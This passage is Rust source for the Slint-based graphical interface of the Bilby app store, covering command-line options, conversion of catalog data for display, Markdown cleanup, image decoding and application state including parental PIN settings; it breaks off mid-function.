//! The graphical store. One Slint window, three interfaces (desktop, mobile, TV), all
//! rendering the same `Store` state that this file fills in from `bilby-core`.
//!
//! Threading: the UI thread never waits on the network. Every catalog call goes through
//! [`App::job`], which runs the work on a worker thread and hands the result back to the
//! UI thread. Under test the same code runs inline, so tests exercise the real handlers.

use bilby_core::catalog::{SearchOutcome, UpdateStatus};
use bilby_core::index::Section as CoreSection;
use bilby_core::install::{self, Action, Dirs};
use bilby_core::model::{age_label, human_count, human_size, AppDetails, AppId, AppSummary, InstallOption, SourceKind};
use bilby_core::platform::{FormFactor, Os, PRESETS};
use bilby_core::state::{now_unix, Favourite, InstalledApp, Settings, State};
use bilby_core::{Catalog, Error, Platform};
use slint::{ComponentHandle, Model, ModelRc, SharedString, VecModel};
use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, RwLock};

slint::include_modules!();

pub mod sound;

const USAGE: &str = "\
Bilby - app store for GitHub Releases, Codeberg and other repositories, filtered to your device

OPTIONS:
    --ui <desktop|mobile|tv>   Force an interface (default: detected; desktop and mobile
                               also switch with the window width)
    --as <platform>            Preview the store as another machine (bilby-cli --list-platforms)
    --demo                     Built-in fictional catalog, no network
    --open <id or link>        Start on an app's page (github:owner/repo, aur:package, URL)
    --search <words>           Start with a search
    --page <name>              Start on discover, search, library, settings or system
    --theme <system|light|dark>  Override the saved appearance for this run
    --size <WxH>               Initial window size
    --state <file>             Use this file for settings and library instead of the default
    --screenshot <file.png>    Render one frame to a PNG and exit
    --script <steps>           With --screenshot: replay input first. Steps are separated by
                               spaces: up down left right ok back tab wait click:X,Y
                               text:WORD install:N
    --settle <ms>              With --screenshot: wait after the script (default 600)
    --report <file>            With --screenshot: also write the interface's state as text

ENVIRONMENT:
    GITHUB_TOKEN               Raises GitHub's API limit from 60 to 5,000 requests per hour
                               (a token saved in Settings does the same)
";

#[derive(Default)]
pub struct Options {
    pub demo: bool,
    pub platform: Option<Platform>,
    pub shell: Option<Shell>,
    pub open: Option<String>,
    pub search: Option<String>,
    pub page: Option<i32>,
    pub theme: Option<String>,
    pub size: Option<(u32, u32)>,
    pub screenshot: Option<PathBuf>,
    /// Input to replay before the screenshot: `down right ok back click:640,300 ...`.
    pub script: Vec<String>,
    /// Milliseconds to wait after the script before the screenshot is taken.
    pub settle_ms: u64,
    /// With a screenshot: also write what the interface is showing, as `key=value` lines.
    pub report: Option<PathBuf>,
    /// Overrides where downloads, cache and settings go (Android passes its app directories).
    pub dirs: Option<Dirs>,
    pub state_file: Option<PathBuf>,
    /// Run catalog work on the calling thread instead of workers. For tests.
    pub inline: bool,
    /// How downloaded files are handed to the system. Defaults to the desktop's own
    /// handler; tests record the call instead of launching installers.
    pub opener: Option<Opener>,
    /// How an installed app is started ([`install::launch`] unless a test says otherwise).
    pub launcher: Option<Opener>,
    /// How another program is started with arguments (Longboard on an address,
    /// Flatpak to run or remove an app): the program and what to pass it.
    pub runner: Option<Runner>,
    /// How the person signs in to Steam on its own page: given a folder for the
    /// browser's data, returns the line the browser handed back, or nothing when the
    /// window was closed. Defaults to the store's sign-in window; tests pass a stand-in.
    pub signin: Option<SignIn>,
    /// Where the sounds of moving about go, instead of the speakers. For tests.
    pub heard: Option<Heard>,
    /// How an address is opened in the person's browser. For tests.
    pub browser: Option<Browser>,
    /// How the person is asked for a folder. For tests.
    pub picker: Option<Picker>,
    /// What the system has of FUSE (looked up when not given). For tests.
    pub fuse: Option<bilby_core::needs::Fuse>,
    /// `rpm-ostree`, on a system that is one read-only image. For tests; looked up
    /// otherwise.
    pub layering: Option<PathBuf>,
    /// How the device is restarted. Tests record it instead.
    pub restart: Option<Restart>,
    /// The machine whose system details and updates are shown. Defaults to this
    /// computer; the demo and previews of other devices get a made-up one.
    pub host: Option<Arc<dyn bilby_core::os::Host>>,
    /// Whether a game controller is attached (looked up when not given). For tests.
    pub controller: Option<bool>,
    /// Steam's library folders, instead of the usual places. For tests.
    pub steam_libraries: Option<Vec<PathBuf>>,
    /// The file the store itself runs from, when that is one it can put in the app menu
    /// (an AppImage). `run` fills this in; tests pass a stand-in.
    pub self_program: Option<PathBuf>,
    pub catalog_factory: Option<CatalogFactory>,
    /// The app id the store looks at for its own updates. Defaults to its GitHub
    /// repository; the demo catalog has no such project, so tests name a stand-in.
    pub store_app: Option<String>,
}

pub type Opener = Arc<dyn Fn(&std::path::Path) -> bilby_core::Result<()> + Send + Sync>;
/// Something that may need an answer first: that the person is an adult, or the PIN.
#[derive(Debug, Clone)]
enum Guarded {
    OpenAdult(String),
    Setting(Change),
    Install(i32),
    Remove(String),
    /// Not a guard: FUSE was added and the question is whether to restart now.
    Restart,
}

/// A change to the family and adult-content settings.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Change {
    FamilyMode(bool),
    AdultOnHome(bool),
    AdultUncovered(bool),
    PinForInstalls(bool),
    SetPin,
    RemovePin,
}

/// What a listing shows in place of something for adults: nothing of it but that it
/// is there, until it is chosen.
fn covered(id: &str) -> AppCard {
    AppCard {
        id: id.into(),
        name: "Adult".into(),
        summary: "Select to view".into(),
        initials: "A".into(),
        tint: slint::Color::from_rgb_u8(0x55, 0x5b, 0x68),
        adult: true,
        ..Default::default()
    }
}

/// Apps on the device that were installed some other way than through the store.
#[derive(Default)]
struct Elsewhere {
    apps: Vec<(String, String)>,
    packages: HashSet<String>,
}

/// Letters and digits only, lower-cased, for comparing an app's name with a package's.
fn plain(text: &str) -> String {
    text.chars().filter(|c| c.is_alphanumeric()).flat_map(char::to_lowercase).collect()
}

pub type SignIn = Arc<dyn Fn(&std::path::Path) -> bilby_core::Result<Option<String>> + Send + Sync>;
/// The answer to "which folder?".
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Picked {
    Folder(PathBuf),
    Cancelled,
    /// This system has no dialog to ask with.
    NoDialog,
}
pub type Picker = Arc<dyn Fn(&std::path::Path) -> Picked + Send + Sync>;

/// Ask with the system's own folder dialog. The demo and tests never reach this.
fn system_picker(start: &std::path::Path) -> Picked {
    let has_dialog = cfg!(any(target_os = "macos", target_os = "windows"))
        || ["kdialog", "zenity"].iter().any(|program| {
            std::env::var_os("PATH").is_some_and(|path| std::env::split_paths(&path).any(|d| d.join(program).is_file()))
        });
    match install::pick_folder(start) {
        Some(folder) => Picked::Folder(folder),
        None if has_dialog => Picked::Cancelled,
        None => Picked::NoDialog,
    }
}

/// Ask the system to restart, as its own menu would.
fn restart_device() -> bilby_core::Result<()> {
    let ran = std::process::Command::new("systemctl").arg("reboot").status();
    match ran {
        Ok(status) if status.success() => Ok(()),
        Ok(_) => Err(Error::Unsupported("the system refused".into())),
        Err(e) => Err(Error::Unsupported(e.to_string())),
    }
}

pub type Restart = Arc<dyn Fn() -> bilby_core::Result<()> + Send + Sync>;
pub type Heard = Arc<dyn Fn(sound::Sound) + Send + Sync>;
pub type Browser = Arc<dyn Fn(&str) -> bilby_core::Result<()> + Send + Sync>;
pub type Runner = Arc<dyn Fn(&std::path::Path, &[String]) -> bilby_core::Result<()> + Send + Sync>;

/// Builds the catalog for a platform and the current settings. The default talks to the
/// real sources (or the demo); tests substitute one that can go offline on demand.
pub type CatalogFactory = Arc<dyn Fn(&Platform, &Settings, &Dirs) -> Arc<Catalog> + Send + Sync>;

impl Options {
    pub fn from_args(args: impl Iterator<Item = String>) -> Result<Options, String> {
        let mut o = Options::default();
        let mut args = args.peekable();
        while let Some(arg) = args.next() {
            let mut value = |name: &str| args.next().ok_or_else(|| format!("{name} needs a value\n\n{USAGE}"));
            match arg.as_str() {
                "--demo" => o.demo = true,
                "--ui" => {
                    o.shell = Some(match value("--ui")?.as_str() {
                        "desktop" => Shell::Desktop,
                        "mobile" => Shell::Mobile,
                        "tv" => Shell::Tv,
                        other => return Err(format!("unknown interface \"{other}\" (desktop, mobile, tv)")),
                    })
                }
                "--as" => {
                    let name = value("--as")?;
                    o.platform = Some(
                        Platform::preset(&name)
                            .ok_or_else(|| format!("unknown platform \"{name}\". Known: {}", PRESETS.join(", ")))?,
                    );
                }
                "--open" => o.open = Some(value("--open")?),
                "--search" => o.search = Some(value("--search")?),
                "--page" => {
                    o.page = Some(match value("--page")?.as_str() {
                        "discover" => 0,
                        "search" => 1,
                        "library" => 2,
                        "settings" => 3,
                        "system" => 4,
                        other => {
                            return Err(format!(
                                "unknown page \"{other}\" (discover, search, library, settings, system)"
                            ))
                        }
                    })
                }
                "--theme" => {
                    let v = value("--theme")?;
                    if !["system", "light", "dark"].contains(&v.as_str()) {
                        return Err(format!("unknown theme \"{v}\" (system, light, dark)"));
                    }
                    o.theme = Some(v);
                }
                "--size" => {
                    let v = value("--size")?;
                    let parsed = v.split_once('x').and_then(|(w, h)| Some((w.parse().ok()?, h.parse().ok()?)));
                    o.size = Some(parsed.ok_or_else(|| format!("--size expects WIDTHxHEIGHT, got \"{v}\""))?);
                }
                "--state" => o.state_file = Some(PathBuf::from(value("--state")?)),
                "--screenshot" => o.screenshot = Some(PathBuf::from(value("--screenshot")?)),
                "--report" => o.report = Some(PathBuf::from(value("--report")?)),
                "--script" => o.script = value("--script")?.split(' ').map(str::to_string).collect(),
                "--settle" => {
                    o.settle_ms = value("--settle")?.parse().map_err(|_| "--settle expects milliseconds".to_string())?
                }
                "-h" | "--help" => return Err(USAGE.to_string()),
                other => return Err(format!("unknown option \"{other}\"\n\n{USAGE}")),
            }
        }
        Ok(o)
    }
}

// ---- core data -> UI data ---------------------------------------------------------

const TINTS: [u32; 10] =
    [0x5b8def, 0x8e6cf0, 0xe0679a, 0xe8804a, 0xd9a521, 0x4fb477, 0x2fa7a0, 0x3d9bd8, 0x7a86a8, 0xc65fd0];

fn initials(name: &str) -> String {
    let words: Vec<&str> = name.split(|c: char| !c.is_alphanumeric()).filter(|w| !w.is_empty()).collect();
    let letters: String = match words.as_slice() {
        [] => "?".to_string(),
        [one] => one.chars().take(2).collect(),
        [first, second, ..] => first.chars().take(1).chain(second.chars().take(1)).collect(),
    };
    let mut chars = letters.chars();
    match (chars.next(), chars.next()) {
        (Some(a), Some(b)) => format!("{}{}", a.to_uppercase(), b.to_lowercase()),
        (Some(a), None) => a.to_uppercase().to_string(),
        _ => "?".to_string(),
    }
}

fn tint_for(id: &str) -> slint::Color {
    let key = id.split_once(':').map(|(_, key)| key).unwrap_or(id);
    let hash = key.bytes().fold(5381u32, |h, b| h.wrapping_mul(33) ^ b as u32);
    slint::Color::from_argb_encoded(0xff00_0000 | TINTS[hash as usize % TINTS.len()])
}

/// Release notes are Markdown, often with HTML mixed in; show them as readable plain
/// text. Links keep their words, images and tags go, list markers become bullets.
/// `install-index` values from here up mean "the hidden file numbered index - this".
const HIDDEN_BASE: i32 = 1000;

/// The share of an app's ratings at five stars, then four, down to one. Empty when the
/// breakdown is not known.
fn spread_shares(rating: bilby_core::model::Rating) -> ModelRc<f32> {
    let total: u32 = rating.spread.iter().sum();
    if total == 0 {
        return ModelRc::default();
    }
    let shares: Vec<f32> = rating.spread.iter().rev().map(|n| *n as f32 / total as f32).collect();
    ModelRc::new(VecModel::from(shares))
}

/// "821 ratings", "12k ratings": how many people rated an app.
fn ratings_text(count: u32) -> String {
    if count == 1 {
        "1 rating".to_string()
    } else {
        format!("{} ratings", human_count(count as u64))
    }
}

/// The opening of a README as plain text: what the project says it is, without the
/// title (the page already shows it), badges, pictures, tables or code samples.
fn plain_about(markdown: &str) -> String {
    const LIMIT: usize = 900;
    let mut kept = Vec::new();
    let (mut in_code, mut title_dropped) = (false, false);
    for line in markdown.lines() {
        let start = line.trim_start();
        if start.starts_with("```") || start.starts_with("~~~") {
            in_code = !in_code;
            continue;
        }
        if in_code || start.starts_with('|') {
            continue;
        }
        if !title_dropped && start.starts_with("# ") {
            title_dropped = true;
            continue;
        }
        kept.push(line);
    }
    let text = plain_notes(&kept.join("\n"));
    if text.chars().count() <= LIMIT {
        return text;
    }
    // Stop at the end of a line rather than mid-sentence.
    let cut: String = text.chars().take(LIMIT).collect();
    let end = cut.rfind('\n').filter(|&i| i > LIMIT / 2).unwrap_or(cut.len());
    format!("{}\n…", cut[..end].trim_end())
}

fn plain_notes(markdown: &str) -> String {
    let mut out = String::new();
    let mut blank_run = 0;
    for line in markdown.lines() {
        let line = strip_inline_markup(line.trim_end());
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        let text = trimmed.trim_start_matches('#').trim_start();
        let text = match text.strip_prefix("- ").or_else(|| text.strip_prefix("* ")).or_else(|| text.strip_prefix("+ "))
        {
            Some(item) => format!("{}•  {item}", " ".repeat(indent.min(6))),
            None => text.to_string(),
        };
        // Horizontal rules and now-empty lines collapse into a single blank line.
        let text = if text.chars().all(|c| matches!(c, '-' | '=' | '_' | '*' | ' ')) { String::new() } else { text };
        if text.is_empty() {
            blank_run += 1;
            if blank_run > 1 || out.is_empty() {
                continue;
            }
        } else {
            blank_run = 0;
        }
        out.push_str(&text);
        out.push('\n');
        if out.len() > 2400 {
            out.push('…');
            break;
        }
    }
    out.trim().to_string()
}

/// `[words](url)` -> `words`, `![alt](url)` -> nothing, `<tag>` -> nothing, and the
/// emphasis markers `**`, `__` and backticks are dropped.
fn strip_inline_markup(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        // A picture that is also a link (`[![alt](picture)](target)`, the shape of every
        // badge) disappears entirely.
        if c == '[' && chars.get(i + 1) == Some(&'!') && chars.get(i + 2) == Some(&'[') {
            let find = |from: usize, what: char| (from..chars.len()).find(|&j| chars[j] == what);
            let whole = find(i + 3, ']')
                .filter(|&alt| chars.get(alt + 1) == Some(&'('))
                .and_then(|alt| find(alt + 2, ')'))
                .filter(|&picture| chars.get(picture + 1) == Some(&']') && chars.get(picture + 2) == Some(&'('))
                .and_then(|picture| find(picture + 3, ')'));
            if let Some(end) = whole {
                i = end + 1;
                continue;
            }
        }
        let image = c == '!' && chars.get(i + 1) == Some(&'[');
        if c == '[' || image {
            let open = if image { i + 1 } else { i };
            if let Some(close) = (open + 1..chars.len()).find(|&j| chars[j] == ']') {
                if chars.get(close + 1) == Some(&'(') {
                    if let Some(end) = (close + 2..chars.len()).find(|&j| chars[j] == ')') {
                        if !image {
                            out.extend(&chars[open + 1..close]);
                        }
                        i = end + 1;
                        continue;
                    }
                }
            }
        }
        if c == '<' {
            // An HTML tag or an autolink; a lone "<" in prose is kept.
            if let Some(end) = (i + 1..chars.len()).find(|&j| chars[j] == '>') {
                let inner: String = chars[i + 1..end].iter().collect();
                if inner.starts_with("http") {
                    out.push_str(&inner);
                    i = end + 1;
                    continue;
                }
                let tag_like = inner.starts_with('/')
                    || inner.starts_with('!')
                    || inner.chars().next().is_some_and(|c| c.is_ascii_alphabetic());
                if tag_like && !inner.contains('<') {
                    i = end + 1;
                    continue;
                }
            }
        }
        if c == '`' || (c == '*' && chars.get(i + 1) == Some(&'*')) || (c == '_' && chars.get(i + 1) == Some(&'_')) {
            i += if c == '`' { 1 } else { 2 };
            continue;
        }
        out.push(c);
        i += 1;
    }
    out
}

fn option_row(o: &InstallOption) -> OptionRow {
    OptionRow {
        file: o.asset.name.clone().into(),
        label: o.label().into(),
        size: human_size(o.asset.size).into(),
        note: o.verdict.note.clone().unwrap_or_default().into(),
        native: o.verdict.level == bilby_core::compat::Level::Native,
        verified: install::checkable_digest(&o.asset).is_some() && o.plan.action != Action::ShowCommand,
        verb: o.plan.verb.clone().into(),
        steps: ModelRc::new(VecModel::from(o.plan.steps.iter().map(SharedString::from).collect::<Vec<_>>())),
        command: o.plan.command.clone().unwrap_or_default().into(),
    }
}

fn plural(n: usize, word: &str) -> String {
    if n == 1 {
        format!("1 {word}")
    } else {
        format!("{n} {word}s")
    }
}

fn theme_mode(name: &str) -> i32 {
    match name {
        "light" => 1,
        "dark" => 2,
        _ => 0,
    }
}

/// 0 decide for me, 1 desktop, 2 TV: the saved layout choice as the interface shows it.
fn interface_mode(saved: &str) -> i32 {
    match saved {
        "desktop" => 1,
        "tv" => 2,
        _ => 0,
    }
}

/// The shape to behave as, given the saved layout choice and what was detected.
fn form_for(saved: &str, detected: FormFactor) -> FormFactor {
    match saved {
        "tv" => FormFactor::Tv,
        // "Desktop" on a phone still means the phone's own layout.
        "desktop" if detected == FormFactor::Tv => FormFactor::Desktop,
        _ => detected,
    }
}

fn shell_for(form_factor: FormFactor) -> Shell {
    match form_factor {
        FormFactor::Desktop => Shell::Desktop,
        FormFactor::Mobile => Shell::Mobile,
        FormFactor::Tv => Shell::Tv,
    }
}

/// The source with this short name (`flathub`, `steam`).
fn source_named(name: &str) -> Option<SourceKind> {
    AppId::parse(&format!("{name}:x")).map(|id| id.source)
}

fn make_catalog(platform: &Platform, demo: bool, settings: &Settings, dirs: &Dirs) -> Arc<Catalog> {
    let mut catalog = if demo {
        Catalog::demo(platform.clone())
    } else {
        // A token typed into Settings wins over the environment.
        let token = Some(settings.github_token.clone())
            .filter(|t| !t.trim().is_empty())
            .or_else(|| std::env::var("GITHUB_TOKEN").ok());
        Catalog::live(platform.clone(), token, dirs.cache.clone())
    };
    catalog.include_prereleases = settings.include_prereleases;
    catalog.disabled = settings.disabled_sources.iter().filter_map(|name| source_named(name)).collect();
    catalog.use_own_sources(
        settings
            .own_sources
            .iter()
            .map(|own| bilby_core::source::own::Added { name: own.name.clone(), url: own.url.clone() })
            .collect(),
    );
    // (The made-up demo catalog has it off already: the list names real apps.)
    catalog.essentials = catalog.essentials && !settings.hide_essentials;
    catalog.prefer = bilby_core::compat::Prefer::named(&settings.prefer_kind);
    catalog.parental =
        bilby_core::parental::Policy { family_mode: settings.family_mode, adult_on_home: settings.adult_on_home };
    catalog.use_flatpak_roots(dirs.flatpak_roots.clone());
    Arc::new(catalog)
}

// ---- application state ------------------------------------------------------------

thread_local! {
    /// Decoded app pictures by owner. Images belong to the UI thread, so they live here
    /// rather than in `App`, which worker threads share.
    static PICTURES: RefCell<HashMap<String, slint::Image>> = RefCell::new(HashMap::new());
}

/// Decode a cached PNG or JPEG into something Slint can draw. Implausible sizes are
/// refused: an avatar is small, and a huge image would only cost memory.
fn decode_picture(path: &std::path::Path) -> Option<slint::Image> {
    let decoded = image::open(path).ok()?.into_rgba8();
    let (width, height) = decoded.dimensions();
    if width == 0 || height == 0 || width > 1024 || height > 1024 {
        return None;
    }
    let buffer = slint::SharedPixelBuffer::<slint::Rgba8Pixel>::clone_from_slice(decoded.as_raw(), width, height);
    Some(slint::Image::from_rgba8(buffer))
}

/// Decode a cached screenshot, scaled down to what a page can use. Tiny images are
/// not screenshots, and absurd ones are refused before they cost memory.
fn decode_screenshot(path: &std::path::Path) -> Option<slint::SharedPixelBuffer<slint::Rgba8Pixel>> {
    let (width, height) = image::image_dimensions(path).ok()?;
    if width < 200 || height < 120 || width > 8000 || height > 8000 {
        return None;
    }
    let decoded = image::open(path).ok()?;
    // Shrink what is larger than a page can show; never enlarge.
    let decoded = if width > 1280 || height > 720 { decoded.thumbnail(1280, 720) } else { decoded }.into_rgba8();
    let (width, height) = decoded.dimensions();
    Some(slint::SharedPixelBuffer::<slint::Rgba8Pixel>::clone_from_slice(decoded.as_raw(), width, height))
}

/// The app's own logo when one is known, else its owner's picture.
fn picture_for(id: &str) -> slint::Image {
    let Some(id) = AppId::parse(id) else { return slint::Image::default() };
    let own = bilby_core::icons::app_key(&id);
    PICTURES.with(|p| {
        let pictures = p.borrow();
        pictures
            .get(&own)
            .or_else(|| bilby_core::icons::icon_key(&id).and_then(|owner| pictures.get(&owner)))
            .cloned()
            .unwrap_or_default()
    })
}

/// The app currently on the details page.
#[derive(Default)]
struct Current {
    id: String,
    details: Option<AppDetails>,
    /// Index into `details.versions` of the release on screen; `None` when the app has
    /// nothing for this machine and only the explanation is shown.
    selected: Option<usize>,
}

impl Current {
    fn release(&self) -> Option<&bilby_core::model::ResolvedRelease> {
        let details = self.details.as_ref()?;
        match self.selected {
            Some(index) => details.versions.get(index),
            None => details.release.as_ref(),
        }
    }
}

pub struct App {
    ui: slint::Weak<AppWindow>,
    catalog: RwLock<Arc<Catalog>>,
    platform: RwLock<Platform>,
    /// What the device was found to be, before any choice of layout was applied.
    detected: FormFactor,
    /// A theme given on the command line, which outranks the saved one.
    theme_override: Option<String>,
    inline: bool,
    dirs: Dirs,
    state_path: PathBuf,
    state: Mutex<State>,
    results: Mutex<(String, Vec<AppSummary>)>,
    updates: Mutex<HashMap<String, UpdateStatus>>,
    last_checked: AtomicU64,
    current: Mutex<Current>,
    /// Bumped per request so a slow, superseded answer is dropped instead of shown.
    search_generation: AtomicU64,
    details_generation: AtomicU64,
    /// An app whose install was asked for from a list, before its files were known.
    install_when_loaded: Mutex<Option<String>>,
    toast_generation: Arc<AtomicU64>,
    cancel_install: Arc<AtomicBool>,
    /// The store's own app id, checked for updates like any other app. `None` in the
    /// demo, whose fictional GitHub does not have it.
    store_app: Option<AppId>,
    /// Library apps waiting their turn after "Update all".
    update_queue: Mutex<std::collections::VecDeque<String>>,
    /// Owners whose picture has been asked for in this session (found or not).
    pictures_requested: Mutex<HashSet<String>>,
    opener: Opener,
    launcher: Opener,
    runner: Runner,
    signin: SignIn,
    /// What this system has of FUSE, which AppImages need to start.
    fuse: std::sync::RwLock<bilby_core::needs::Fuse>,
    /// That was given rather than looked up (a test, or the made-up demo device).
    fuse_given: bool,
    /// `rpm-ostree`, where the system is one read-only image that packages are added
    /// on top of.
    layering: Option<PathBuf>,
    /// FUSE has been added on top of the image and waits for a restart.
    fuse_staged: std::sync::atomic::AtomicBool,
    /// That has just happened, and the person has not been asked about restarting yet.
    fuse_just_staged: std::sync::atomic::AtomicBool,
    restart: Restart,
    /// A package the app on screen needs before it will run, which the store installs
    /// along with it.
    needed: Mutex<Option<AppId>>,
    /// The app on screen is an AppImage and this system lacks the FUSE it would use.
    lacks_fuse: std::sync::atomic::AtomicBool,
    /// The Steam account signed in to, kept beside the saved state for quick lookups.
    steam: std::sync::RwLock<Option<bilby_core::steam_account::Account>>,
    /// Bumped whenever a Steam sign-in starts or is cancelled, so a late answer is dropped.
    steam_generation: AtomicU64,
    /// Where the quiet sounds of moving about go. Tests record them; a run that draws
    /// one picture and leaves makes none.
    heard: Option<Heard>,
    #[cfg(not(target_os = "android"))]
    player: std::sync::OnceLock<sound::Player>,
    /// Never play through the speakers: a test, or a run that only takes a picture.
    silent: bool,
    /// How an address is opened in the person's browser. Tests record it instead.
    browser: Browser,
    /// How the person is asked for a folder. Tests answer for them.
    picker: Picker,
    /// The folder just chosen for the one download about to start.
    asked_folder: Mutex<Option<PathBuf>>,
    /// A newer copy of the store itself, placed and ready to be restarted into.
    self_new: Mutex<Option<PathBuf>>,
    /// What is waiting on an answer at the gate (an age question or the PIN).
    pending: Mutex<Option<Guarded>>,
    /// Ids learnt to be for adults, so that opening one again asks before loading it.
    known_adult: Mutex<HashSet<String>>,
    /// A new PIN entered once, waiting to be entered again.
    new_pin: Mutex<Option<String>>,
    /// The PIN was entered in this sitting, so adult content opens without asking again.
    adult_unlocked: std::sync::atomic::AtomicBool,
    /// The PIN was just entered for one install or removal.
    install_cleared: std::sync::atomic::AtomicBool,
    /// What is on this device that the store did not put there: Flatpaks and Steam
    /// games as (app id, name), and the names of the system's installed packages.
    elsewhere: std::sync::RwLock<Elsewhere>,
    /// Icon addresses the sources gave, by app id.
    icon_urls: Mutex<HashMap<String, String>>,
    catalog_factory: CatalogFactory,
    /// The machine itself, what it is, and what the last look for updates found.
    host: Arc<dyn bilby_core::os::Host>,
    system: bilby_core::os::Report,
    system_check: Mutex<Option<bilby_core::os::Check>>,
    /// Lists fetched from the sources (popular on Flathub, ...), shown under the
    /// bundled ones once they arrive.
    collections: Mutex<Vec<CoreSection>>,
    /// The store's own file, when it can be put in the app menu.
    self_program: Option<PathBuf>,
    /// Bumped when a sign-in to GitHub starts or is cancelled, so an older one stops.
    signin_generation: AtomicU64,
    /// Where Steam's library is, when a test says; otherwise the usual places.
    steam_libraries: Option<Vec<PathBuf>>,
    /// Search results are narrowed to this source, when one is chosen.
    result_filter: Mutex<Option<SourceKind>>,
    /// For each app the last search found at several sources: every source's entry
    /// for it, as (app id, what to call the source).
    alternates: Mutex<HashMap<String, Vec<(String, String)>>>,
}

/// The store's icon, written beside its app-menu entry.
const ICON_PNG: &[u8] = include_bytes!("../../../packaging/bilby.png");

impl App {
    fn catalog(&self) -> Arc<Catalog> {
        self.catalog.read().unwrap().clone()
    }

    /// The settings and library as they are right now.
    pub fn state(&self) -> State {
        self.state.lock().unwrap().clone()
    }

    /// Change the saved state and write it to disk. A failed write is reported, not fatal.
    fn update_state(&self, ui: &AppWindow, change: impl FnOnce(&mut State)) {
        let result = {
            let mut state = self.state.lock().unwrap();
            change(&mut state);
            state.save(&self.state_path)
        };
        if let Err(e) = result {
            self.toast(ui, &format!("Couldn't save your settings: {e}"), true);
        }
    }

    /// Run `work` off the UI thread, then `done` on it. Inline under test.
    fn job<T: Send + 'static>(
        self: &Arc<Self>,
        work: impl FnOnce(&App) -> T + Send + 'static,
        done: impl FnOnce(&Arc<App>, &AppWindow, T) + Send + 'static,
    ) {
        if self.inline {
            let result = work(self);
            if let Some(ui) = self.ui.upgrade() {
                done(self, &ui, result);
                self.refresh_quota(&ui);
                self.load_pictures(&ui);
            }
            return;
        }
        let app = self.clone();
        std::thread::spawn(move || {
            let result = work(&app);
            let weak = app.ui.clone();
            let _ = slint::invoke_from_event_loop(move || {
                if let Some(ui) = weak.upgrade() {
                    done(&app, &ui, result);
                    app.refresh_quota(&ui);
                    app.load_pictures(&ui);
                }
            });
        });
    }

    /// Fetch pictures for every app on screen that does not have one yet. Runs after
    /// each job, so whatever a job put on screen gets its pictures; owners already asked
    /// for are skipped, which is also what ends the chain.
    pub fn load_pictures(self: &Arc<Self>, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let mut shown: Vec<String> = Vec::new();
        for section in store.get_sections().iter() {
            shown.extend(section.apps.iter().map(|c| c.id.to_string()));
        }
        shown.extend(store.get_results().iter().map(|c| c.id.to_string()));
        shown.extend(store.get_suggestions().iter().map(|c| c.id.to_string()));
        shown.extend(store.get_library().iter().map(|r| r.card.id.to_string()));
        for section in store.get_tv_library_rows().iter() {
            shown.extend(section.apps.iter().map(|c| c.id.to_string()));
        }
        shown.push(store.get_app().id.to_string());

        // For each app: its own logo (an address the source gave, or one found earlier
        // and kept on disk), and its owner's picture to fall back on.
        let wanted: Vec<(String, AppId, Option<String>)> = {
            let mut requested = self.pictures_requested.lock().unwrap();
            let urls = self.icon_urls.lock().unwrap();
            let mut wanted = Vec::new();
            let icons = self.dirs.cache.join("icons");
            for id in shown.iter().filter_map(|id| AppId::parse(id)) {
                let own = bilby_core::icons::app_key(&id);
                match urls.get(&id.to_string()) {
                    Some(url) => {
                        if requested.insert(own.clone()) {
                            wanted.push((own, id.clone(), Some(url.clone())));
                        }
                    }
                    // No address yet. A logo found on an earlier visit is used; otherwise
                    // the question stays open, because the address may still arrive.
                    // A website's picture comes from the site itself.
                    None if id.source == SourceKind::Web => {
                        if requested.insert(own.clone()) {
                            wanted.push((own, id.clone(), Some(SITE_ICON.to_string())));
                        }
                    }
                    None => {
                        if !requested.contains(&own) && matches!(bilby_core::icons::cached(&icons, &own), Some(Some(_)))
                        {
                            requested.insert(own.clone());
                            wanted.push((own, id.clone(), Some(String::new())));
                        }
                    }
                }
                if let Some(owner) = bilby_core::icons::icon_key(&id) {
                    if requested.insert(owner.clone()) {
                        wanted.push((owner, id, None));
                    }
                }
            }
            wanted
        };
        if wanted.is_empty() {
            return;
        }
        // A few at a time, each group on its own: a slow site holds up only its group,
        // and pictures appear as they arrive instead of all at the end.
        for group in wanted.chunks(4).map(<[_]>::to_vec) {
            let dir = self.dirs.cache.join("icons");
            self.job(
                move |app| {
                    let http = app.catalog().http();
                    group
                        .into_iter()
                        .filter_map(|(key, id, own)| {
                            let path = match own {
                                // No address: only what an earlier visit to its page left on disk.
                                Some(url) if url.is_empty() => bilby_core::icons::cached(&dir, &key).flatten(),
                                Some(url) if url == SITE_ICON => {
                                    bilby_core::icons::fetch_site(http.as_ref(), &dir, &key, &id.key).ok()?
                                }
                                Some(url) => {
                                    bilby_core::icons::fetch_picture(http.as_ref(), &dir, &key, &url, 2 * 1024 * 1024)
                                        .ok()?
                                }
                                None => bilby_core::icons::fetch(http.as_ref(), &dir, &id).ok()?,
                            };
                            Some((key, path?))
                        })
                        .collect::<Vec<_>>()
                },
                |app, ui, found| {
                    if found.is_empty() {
                        return;
                    }
                    PICTURES.with(|pictures| {
                        for (key, path) in found {
                            // A file that will not decode is simply not shown.
                            if let Some(image) = decode_picture(&path) {
                                pictures.borrow_mut().insert(key, image);
                            }
                        }
                    });
                    app.refresh(ui);
                    let store = ui.global::<Store>();
                    let mut card = store.get_app();
                    card.icon = picture_for(&card.id);
                    store.set_app(card);
                    let suggestions: Vec<AppCard> = store
                        .get_suggestions()
                        .iter()
                        .map(|mut c| {
                            c.icon = picture_for(&c.id);
                            c
                        })
                        .collect();
                    store.set_suggestions(ModelRc::new(VecModel::from(suggestions)));
                },
            );
        }
    }

    fn toast(&self, ui: &AppWindow, message: &str, is_error: bool) {
        let store = ui.global::<Store>();
        store.set_toast(message.into());
        store.set_toast_is_error(is_error);
        let generation = self.toast_generation.fetch_add(1, Ordering::SeqCst) + 1;
        if self.inline {
            return;
        }
        // Errors stay longer. The timer only clears the toast it was started for.
        let latest = self.toast_generation.clone();
        let weak = self.ui.clone();
        slint::Timer::single_shot(std::time::Duration::from_secs(if is_error { 7 } else { 4 }), move || {
